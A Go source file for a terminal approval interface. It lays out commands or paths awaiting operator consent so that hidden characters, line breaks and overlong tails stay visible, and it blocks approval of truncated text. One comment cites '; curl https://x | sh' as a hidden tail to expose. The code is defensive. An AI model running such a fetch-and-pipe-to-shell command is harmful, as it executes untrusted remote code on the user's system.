package ui

import (
	"strconv"
	"strings"
	"unicode/utf8"

	"github.com/bharathvbcr/Manvi/manvi/ui/render"
)

// SubjectLabelWidth is the column the subject's label occupies, so the rows of
// a wrapped subject line up under the first one on every face.
const SubjectLabelWidth = 8

// SubjectLabel is the noun a face uses for what a decision is about. It defaults
// to "path", which is what every producer meant before the kind existed.
func SubjectLabel(subject string) string {
	switch subject {
	case "command":
		return "command"
	case "question":
		return "question"
	}
	return "path"
}

// SubjectRow is one row of a decision's subject. Label is set on the first row
// only; the rows after it are indented under it by the caller. Footer marks the
// closing row of a subject that was cut: its text says how much is hidden, and
// a subject with a footer is never allowable.
type SubjectRow struct {
	Label  string
	Text   string
	Footer bool
}

// MaxSubjectRows bounds how many rows of a subject any face builds. A longer one
// is shown up to the bound with a footer, and cannot be approved: what an
// operator has not been able to read is not something they can consent to.
const MaxSubjectRows = 64

// SubjectTruncated reports that rows end in a footer, so part of the subject is
// hidden.
func SubjectTruncated(rows []SubjectRow) bool {
	return len(rows) > 0 && rows[len(rows)-1].Footer
}

// DecisionRows is the one place a decision's subject is laid out, for the
// approval card, the transcript entry and the line renderer alike.
//
// The subject is what an operator is consenting to, so it is shown whole up to
// MaxSubjectRows: wrapped at width, never cut mid-row, with the characters a
// terminal would otherwise act on drawn as visible markers by Sanitize, and the
// invisible ones (zero-width and tag runes) marked here beside it. A command
// whose tail is "; curl https://x | sh" cannot be hidden behind a row's edge, a
// newline in it cannot start a row that reads as something else, and an escape
// sequence in it cannot repaint the screen.
//
// width is the whole row, label column included. The work done is bounded by
// MaxSubjectRows regardless of how long text is.
func DecisionRows(subject, text string, width int) []SubjectRow {
	label := SubjectLabel(subject)
	avail := width - SubjectLabelWidth
	if avail < 1 {
		avail = 1
	}
	// Only a prefix is laid out. Markers make the drawn text longer than the
	// bytes, so the prefix is a bound on work, and the rows are cut again below.
	limit := MaxSubjectRows * avail
	total := utf8.RuneCountInString(text)
	prefix := text
	if total > limit {
		prefix = string([]rune(text)[:limit])
	}
	chunks := wrapHard(markInvisible(Sanitize(visibleControls(prefix))), avail)
	hidden := 0
	if len(chunks) > MaxSubjectRows {
		hidden = len(chunks) - MaxSubjectRows
		chunks = chunks[:MaxSubjectRows]
	}
	if total > limit {
		hidden += (total - limit + avail - 1) / avail
	}
	rows := make([]SubjectRow, 0, len(chunks)+1)
	for i, chunk := range chunks {
		row := SubjectRow{Text: chunk}
		if i == 0 {
			row.Label = label
		}
		rows = append(rows, row)
	}
	if len(rows) == 0 {
		rows = append(rows, SubjectRow{Label: label})
	}
	if hidden > 0 {
		rows = append(rows, SubjectRow{Text: "… " + strconv.Itoa(hidden) + " more rows hidden", Footer: true})
	}
	return rows
}

// markInvisible draws the characters Sanitize leaves alone but that show nothing
// — zero-width joiners and spaces, the word joiner, the byte-order mark and the
// tag block — as the same visible escapes it uses for the rest.
func markInvisible(s string) string {
	plain := true
	for _, r := range s {
		if isInvisible(r) {
			plain = false
			break
		}
	}
	if plain {
		return s
	}
	var b strings.Builder
	for _, r := range s {
		if isInvisible(r) {
			b.WriteString(markerFor(r))
			continue
		}
		b.WriteRune(r)
	}
	return b.String()
}

func isInvisible(r rune) bool {
	return (r >= 0x200b && r <= 0x200d) || r == 0x2060 || r == 0xfeff || (r >= 0xe0000 && r <= 0xe007f)
}

// visibleControls draws line breaks and tabs as \n, \r and \t. Whitespace
// inside a subject is part of what is being approved, so it is made visible
// rather than collapsed or acted on.
func visibleControls(s string) string {
	if !strings.ContainsAny(s, "\n\r\t") {
		return s
	}
	return strings.NewReplacer("\n", `\n`, "\r", `\r`, "\t", `\t`).Replace(s)
}

// wrapHard splits s into rows of at most width display columns, without
// dropping or collapsing anything: concatenating the rows gives s back.
func wrapHard(s string, width int) []string {
	var rows []string
	var cur strings.Builder
	used := 0
	for _, r := range s {
		w := render.RuneWidth(r)
		if used+w > width && used > 0 {
			rows = append(rows, cur.String())
			cur.Reset()
			used = 0
		}
		cur.WriteRune(r)
		used += w
	}
	if used > 0 || len(rows) == 0 {
		rows = append(rows, cur.String())
	}
	return rows
}
